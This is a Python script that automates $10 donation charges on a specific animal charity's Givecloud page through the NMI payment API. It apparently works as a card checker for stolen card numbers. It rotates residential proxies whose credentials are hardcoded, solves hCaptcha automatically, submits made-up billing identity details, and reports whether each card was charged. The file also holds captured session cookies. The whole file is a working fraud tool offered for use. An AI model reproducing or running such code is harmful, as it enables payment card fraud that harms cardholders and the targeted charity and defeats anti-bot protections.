import requests,random,time
from capsolv import solve_hcaptcha

def proxies():
    proxies = [
        'us9.cactussstp.com:3129:akoitwja:x9b2wc76QW',
        'gate-sg.ipfoxy.io:58688:customer-wdjc2FIvnU-cc-US-st-Massachusetts-city-Chicopee-sessid-1734868756_10027:bCpX1r7MRCkhatz',
    ]
    format_proxy = lambda x: f"http://{x.split(':')[2]}:{x.split(':')[3]}@{x.split(':')[0]}:{x.split(':')[1]}"
    return {'http': format_proxy(random.choice(proxies)), 'https': format_proxy(random.choice(proxies))}


def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    
async def Vantiv_charge1(cc, mm, yy, cvv):
    if len(yy) == 4:
        yy = yy[-2:]
    exp = f'{mm}{yy}'
    r = requests.Session()
    r.proxies = proxies()
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': 'givecloud_session=oBXeD1ZgNxGd2C036Lirw2lEWZbqtt1FZwBE4aW3; givecloud_visitor=eyJpdiI6ImsyRVFaenJqV0FrRzd3bUw1NU9NK3c9PSIsInZhbHVlIjoiQ003VnpmcjBuVmhtRmR6V1lHK1krM0pYdzJjLzRtL3NrWkx2cnh4ZUwvUXYrbGhuSUJ6cXFhWXR6NW1EZzhwNXVoR1pFSjhqVW1NRk43Q1BwOEU1L09vSlYrNk5QQUhleFJOalBtQXRHVVk9IiwibWFjIjoiMjQ2ZTE3ZDFjYWVmMWZjMzAzNGRhNzBlZTYyMGVmMmI1MjUxNDJlNTE5NDI3ZDM0NTc0NGI3Nzg4ZTJiMmZjMiIsInRhZyI6IiJ9; gc_popup_78b75cdcfd9a7f021f3ff59311d143bd=true; __ls_uid=6051a573-310b-4d8b-78eb-ace65fdd272e; __ls_sid=2c420021-58d7-4773-4b86-bd9b2531eca5:ddc63490; __ls_exp=1731684493; XSRF-TOKEN=eyJpdiI6Ind1ejRhRFM1VEJ2UmxCZU9URXRqdWc9PSIsInZhbHVlIjoiOUwvcVYxTXpJQkVqcUhwQ1ppVDRpSnA3aiswdEpRN2liTkZTYllzRWxleW0rcWY0YUVsV3QwTzFYTzkxUG5idGxGb2RZdmdpam5ZK2ZTeHl0YWNxeHFSTHpKRkNLSjNEWFR4QkV0WUJxMTRvU01aT2xWZUh1RURkN09wMVNYMVMiLCJtYWMiOiIzMTM0ZTFiNmQwYmI1ZTZmNjBhMjQ2NzJmZGY0MGNhY2E0NDAyZGQ1MzA5OTViYWJmYzhmYmQyYjQxYzRkNjdhIiwidGFnIjoiIn0%3D',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    response = r.get('https://hawspets.givecloud.co/give', headers=headers)
    cookies = response.cookies.get_dict()
    x_csrf_token = cookies['XSRF-TOKEN']
    csrf_token = getstr(response.text, 'csrf-token" content="', '"')

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': 'givecloud_session=oBXeD1ZgNxGd2C036Lirw2lEWZbqtt1FZwBE4aW3; givecloud_visitor=eyJpdiI6ImsyRVFaenJqV0FrRzd3bUw1NU9NK3c9PSIsInZhbHVlIjoiQ003VnpmcjBuVmhtRmR6V1lHK1krM0pYdzJjLzRtL3NrWkx2cnh4ZUwvUXYrbGhuSUJ6cXFhWXR6NW1EZzhwNXVoR1pFSjhqVW1NRk43Q1BwOEU1L09vSlYrNk5QQUhleFJOalBtQXRHVVk9IiwibWFjIjoiMjQ2ZTE3ZDFjYWVmMWZjMzAzNGRhNzBlZTYyMGVmMmI1MjUxNDJlNTE5NDI3ZDM0NTc0NGI3Nzg4ZTJiMmZjMiIsInRhZyI6IiJ9; XSRF-TOKEN=eyJpdiI6IjBnVkUxUUpORS9nWnhCUU00Q1Nhdmc9PSIsInZhbHVlIjoiaEhWZjA1a29qMlJBQTRXV2FONTVBVk53SXd6VWhPSGVxYjdPRXNFRHJZdU5PV2h4YmUyVXo5YWFQRHdZRUZYWkRYSUFmRkUwTGVNalo1UWVXUSttdEk4S2RKUnZOcnJhR1liYkNHejNNTDlwWXFqZUVwSXZFd2dWK3o5WTZicUoiLCJtYWMiOiJlM2QwNjQzY2EyNWZkODk3MGY2MjRhZDBjN2M4NGE4ZDQwMWEwYTZkNDI1NDc2YTBhZGNjOWUyMGViZWJmN2M5IiwidGFnIjoiIn0%3D; gc_popup_78b75cdcfd9a7f021f3ff59311d143bd=true; __ls_uid=6051a573-310b-4d8b-78eb-ace65fdd272e; __ls_sid=2c420021-58d7-4773-4b86-bd9b2531eca5:ddc63490; __ls_exp=1731684493',
        'origin': 'https://hawspets.givecloud.co',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://hawspets.givecloud.co/give',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-csrf-token': csrf_token,
        'x-locale': 'en-US',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': x_csrf_token,
    }
    try:
        recap = await solve_hcaptcha("https://hawspets.givecloud.co/give", "98e5065c-ad73-4417-a8ce-f8b296e69cf6")
    except:
        return 'Failed to solve captcha'
    json_data = {
    'account_type_id': 1,
    'currency_code': 'USD',
    'payment_type': 'credit_card',
    'experience_type': 'page_with_payment',
    'experience_id': '1',
    'billing_title': None,
    'billing_first_name': 'Albedo',
    'billing_last_name': 'Jones',
    'billing_company': None,
    'billing_email': 'rkjnjfrgfr@gmail.com',
    'email_opt_in': False,
    'billing_address1': 'New York',
    'billing_address2': None,
    'billing_city': 'New York',
    'billing_province_code': 'NY',
    'billing_zip': '10080',
    'billing_country_code': 'US',
    'billing_phone': '87556547485',
    'cover_fees': False,
    'cover_costs_type': None,
    'is_anonymous': False,
    'comments': '',
    'password': 'bhdfvhfbg',
    'recaptcha_response': recap,
    'referral_source': 'Event',
    'item': {
        'form_fields': {},
        'variant_id': '1',
        'amt': 10,
        'other_amount': '10',
        'recurring_day': '22',
        'recurring_day_of_week': '7',
        'product_id': '1',
        'recurring_frequency': '',
        'notes': '',
        'account_type_id': '1',
        'billing_first_name': 'Albedo',
        'billing_last_name': 'Jones',
        'billing_email': 'rkjnjfrgfr@gmail.com',
        'billing_phone': '87556547485',
        'password': 'bhdfvhfbg',
        'referral_source': 'Event',
        'gift_aid': False,
        'gl_code': None,
    },
    'cover_costs_enabled': False,
    'utm_source': '',
    'utm_medium': '',
    'utm_campaign': '',
    'utm_term': '',
    'utm_content': '',
}

    try:
        response = r.post('https://hawspets.givecloud.co/gc-json/v1/checkouts', headers=headers, json=json_data)
        cart_id = response.json()['cart']['id']
    except:
        return 'Failed to create cart'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': '__ls_uid=6051a573-310b-4d8b-78eb-ace65fdd272e; givecloud_session=9LSdk0bYcf2k7p4JCQDCEWJKgsAsNQg54V0Hktai; givecloud_visitor=eyJpdiI6ImIvU2hPY1JmbHFjUTZyeFhOMGhiQ2c9PSIsInZhbHVlIjoiOGtJYTdldFJDVmxxUjhZcEJUY1B4eGVwT21ZZkNNa0YyVm0rS0IvR202Z3pUMXVoNnlrQlZkN1VxV0pQUFo0eFBIaTV4MHF4cWpCTG5rTy95WlBnOVQxUmo3STF6cnpnTEhUczhxejk4WW89IiwibWFjIjoiYmZmOGVjODhlNGVkNDFhNDQyNjllMTVhNTU2MmU2OGJkNTk4NWRiOWNkNTBhZTA5NmMxOTRiN2VjZjM2MWY3NSIsInRhZyI6IiJ9; __ls_sid=236dd136-8b99-4112-5daf-76b8d455e868:aa213v9b; __ls_exp=1731693039; gc_popup_78b75cdcfd9a7f021f3ff59311d143bd=true; XSRF-TOKEN=eyJpdiI6ImM5SmVmcTNFaWwzK0ZEdmdQem96UkE9PSIsInZhbHVlIjoiMUU1bzdNaDdNalRteFNnZTFhYy9udkt0RzJobTdyckNsNHh5L2lTM09OMEpQRzNGdVlSQnFOWjlIdkkvNE1lbUoxR1Jlakt1d2tUeE0vcm1vaVNSKzd3NTRQWUhOUThMeURocmRCbUdIS3cyRWFvcE1vc1BCSHFiWjROZTAralYiLCJtYWMiOiJiM2IzNmY2MGYwOTIzNWI2MjRhNzgzODMxNmY2Zjk0MmJjOWQzNWJiOWE3YjAxZmI3YzIzMTFiYzM2Y2E1ZTQ0IiwidGFnIjoiIn0%3D',
        'origin': 'https://hawspets.givecloud.co',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://hawspets.givecloud.co/give',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-csrf-token': csrf_token,
        'x-locale': 'en-US',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': x_csrf_token,
    }

    json_data = {
        'context': 'web',
        'provider': 'safesave',
        'payment_type': 'credit_card',
        'save_payment_method': False,
        'g-recaptcha-response': recap,
    }
    try:
        response = r.post(
        f'https://hawspets.givecloud.co/gc-json/v1/carts/{cart_id}/capture',
        headers=headers,
        json=json_data,
    )
        token = getstr(response.text, 'three-step\\/', '"')
    except:
        return 'Failed to capture cart'

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://hawspets.givecloud.co',
        'Pragma': 'no-cache',
        'Referer': 'https://hawspets.givecloud.co/give',
        'Sec-Fetch-Dest': 'iframe',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'billing-cc-number': cc,
        'billing-cvv': cvv,
        'billing-cc-exp': exp,
    }
    try:
        response = r.post(f'https://secure.nmi.com/api/v2/three-step/{token}', headers=headers, data=data)
    except:
        return 'Failed to charge'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        # 'cookie': '__ls_uid=6051a573-310b-4d8b-78eb-ace65fdd272e; givecloud_session=9LSdk0bYcf2k7p4JCQDCEWJKgsAsNQg54V0Hktai; givecloud_visitor=eyJpdiI6ImIvU2hPY1JmbHFjUTZyeFhOMGhiQ2c9PSIsInZhbHVlIjoiOGtJYTdldFJDVmxxUjhZcEJUY1B4eGVwT21ZZkNNa0YyVm0rS0IvR202Z3pUMXVoNnlrQlZkN1VxV0pQUFo0eFBIaTV4MHF4cWpCTG5rTy95WlBnOVQxUmo3STF6cnpnTEhUczhxejk4WW89IiwibWFjIjoiYmZmOGVjODhlNGVkNDFhNDQyNjllMTVhNTU2MmU2OGJkNTk4NWRiOWNkNTBhZTA5NmMxOTRiN2VjZjM2MWY3NSIsInRhZyI6IiJ9; __ls_sid=236dd136-8b99-4112-5daf-76b8d455e868:aa213v9b; __ls_exp=1731693039; gc_popup_78b75cdcfd9a7f021f3ff59311d143bd=true; XSRF-TOKEN=eyJpdiI6Ikk3VGQ0N2J4S2xwUDNKd0lGNEI0eFE9PSIsInZhbHVlIjoid1h0amVLd3ZnMkZpUHdrRHdxOHpRVTc4aGJyTkJySTVUMkpLL1Y5b2hEMnVQY3hPMTJDeDlKYUZkck9MbXJEUzU3cDNMVmplV3pnT2Y2UmZVbE9GbkV3aTFNcmJTRndSMnNSK0pFRmFaQmVQL3d1UVJzMHJKS29QWWVYQ1cvNlYiLCJtYWMiOiI1ZmIzZjMxNzk3ZTJkMGUxYzcxNTlmZDYyOGUwYzFhNDA1YzM3ZDczMmVhNDA5YzYzZTRjYmZkMTc2MDcyZmJhIiwidGFnIjoiIn0%3D',
        'origin': 'https://hawspets.givecloud.co',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://hawspets.givecloud.co/give',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-csrf-token': csrf_token,
        'x-locale': 'en-US',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': x_csrf_token,
    }

    json_data = {
        'provider': 'safesave',
        'token': token,
        'visitor': '770d86b1-6021-473e-9a96-9311404beb1c',
    }
    try:
        response = r.post(
            f'https://hawspets.givecloud.co/gc-json/v1/carts/{cart_id}/charge',
            headers=headers,
            json=json_data,
        )
        if response.status_code != 200:
            if 'error' in response.json():
                return response.json()['error']
            else:
                return 'Unknown error'
        elif response.status_code == 200:
            return 'Charged $10'
        else:
            return 'Unknown error'
    except:
        return 'Unexpected error'
